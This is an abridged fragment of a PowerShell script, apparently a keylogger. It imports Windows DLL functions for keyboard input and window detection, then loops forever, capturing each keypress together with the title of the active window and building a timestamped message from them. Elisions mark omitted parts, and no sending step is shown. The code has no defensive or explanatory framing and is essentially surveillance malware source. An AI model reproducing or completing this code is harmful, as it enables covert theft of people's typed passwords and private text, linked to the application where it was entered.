...
# Import DLL Definitions for keyboard inputs and window detection
$API = @'
...
While ($true){
  $keyPressed = $false
    try{
      ...
      $hwndActive = $API::GetForegroundWindow()
      $windowTitle = New-Object -TypeName System.Text.StringBuilder -ArgumentList 256
      $API::GetWindowText($hwndActive, $windowTitle, $windowTitle.Capacity)
      ...
      # Add the window title to the message
      $escmsg = $timestamp+" | Window: " + $activeWindow + " | " + '`'+$escmsgsys+'`'
